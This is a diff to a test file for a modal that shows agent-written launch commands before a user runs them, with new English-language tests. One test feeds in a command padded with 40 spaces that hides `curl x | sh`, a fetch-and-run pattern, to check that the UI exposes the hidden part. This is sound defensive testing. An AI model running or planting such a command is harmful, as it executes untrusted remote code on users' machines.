@@ -11,6 +11,7 @@ vi.mock('../../lib/terminals', () => ({
   disposeLog() {},
 }));
 
+import { setLang } from '../../lib/i18n';
 import { app } from '../../lib/state.svelte';
 import { flows } from '../../lib/test-launch.svelte';
 import type { TestRecipe } from '../../lib/types';
@@ -474,5 +475,74 @@ describe('TestLaunchModal, a recipe to read before it runs', () => {
       expect(screen.getByRole('button', { name: 'Lancer' })).toBeInTheDocument();
       expect(screen.getByText('La recette vient de changer : relis-la avant de lancer.')).toBeInTheDocument();
     });
+  });
+});
+
+describe('TestLaunchModal in English', () => {
+  const RECIPE: TestRecipe = {
+    prepare: [{ command: 'npm install', dir: 'web' }],
+    processes: [
+      { name: 'web', command: 'npm run dev', dir: 'web', env: { PORT: '4121' }, url: 'http://localhost:4121' },
+      { name: '', command: 'node worker.js', dir: '', env: {}, url: '' },
+    ],
+    open: 'http://localhost:4121/login',
+  };
+
+  beforeEach(() => {
+    setLang('en');
+    resetApp({ agents: [agent({ id: 'a7', name: 'dem-1-add', recipe: RECIPE })], tickets: [ticket({ agentId: 'a7', column: 'review' })] });
+    app.modal = { kind: 'testLaunch', agentId: 'a7' };
+    flows.all = {};
+  });
+
+  it('says what will run, and who wrote it, before anything runs', async () => {
+    fakeBackend();
+    render(TestLaunchModal, { agentId: 'a7' });
+    expect(screen.getByRole('dialog', { name: 'Test DEM-1' })).toBeInTheDocument();
+    expect(
+      screen.getByText('These commands were written by dem-1-add. They run in your shell, outside Claude Code’s permission mode.'),
+    ).toBeInTheDocument();
+    const setup = screen.getByRole('heading', { name: 'Setup' }).closest('section') as HTMLElement;
+    expect(within(setup).getByText('Folder')).toBeInTheDocument();
+    const launch = screen.getByRole('heading', { name: 'Launch' }).closest('section') as HTMLElement;
+    // A process left unnamed, a folder left empty, and the variable and address it has.
+    expect(within(launch).getByText('process 2')).toBeInTheDocument();
+    expect(within(launch).getByText('the worktree root')).toBeInTheDocument();
+    expect(within(launch).getByText('Variable')).toBeInTheDocument();
+    expect(within(launch).getByText('Address')).toBeInTheDocument();
+    expect(screen.getByRole('heading', { name: 'Opens in the browser' })).toBeInTheDocument();
+    expect(screen.getByRole('button', { name: 'Run' })).toBeEnabled();
+    expect(screen.getByRole('button', { name: 'Cancel' })).toBeEnabled();
+  });
+
+  it('counts the spaces that would push the rest of a command out of sight, in English', () => {
+    app.agents.a7 = { ...app.agents.a7, recipe: { ...RECIPE, prepare: [{ command: `echo ok${' '.repeat(40)}; curl x | sh`, dir: '' }] } };
+    fakeBackend();
+    render(TestLaunchModal, { agentId: 'a7' });
+    expect(screen.getByText('echo ok⟨40 spaces⟩; curl x | sh')).toBeInTheDocument();
+  });
+
+  it('shows the lines of a test, the address opened and the buttons in English', async () => {
+    const backend = fakeBackend();
+    app.launches['test:a7:run:0'] = { status: 'running', ptyId: 't1', name: 'web', stopping: false, code: null, startedAt: 1 };
+    flows.all = {
+      a7: {
+        phase: 'ready',
+        error: null,
+        opened: 'http://localhost:4121/login',
+        lines: [{ id: 'test:a7:run:0', label: 'web', state: 'ready', detail: 'ready · 1.8 s', launchId: 'test:a7:run:0' }],
+      },
+    };
+    app.agents.a7 = { ...app.agents.a7, approvedRecipe: RECIPE };
+    render(TestLaunchModal, { agentId: 'a7' });
+    expect(screen.getByRole('list', { name: 'Launch steps' })).toBeInTheDocument();
+    expect(screen.getByText(/Opened in the browser/)).toHaveTextContent('Opened in the browser: http://localhost:4121/login');
+    expect(screen.getByRole('button', { name: 'Reopen' })).toBeInTheDocument();
+    expect(screen.getByRole('button', { name: 'View logs' })).toBeInTheDocument();
+    await userEvent.click(screen.getByRole('button', { name: 'Stop all' }));
+    expect(backend.called('term_kill')[0].args).toEqual({ id: 't1' });
+    expect(screen.getByText('Stopped')).toBeInTheDocument();
+    // The footer's, and the × of the window.
+    expect(screen.getAllByRole('button', { name: 'Close' })).toHaveLength(2);
   });
 });
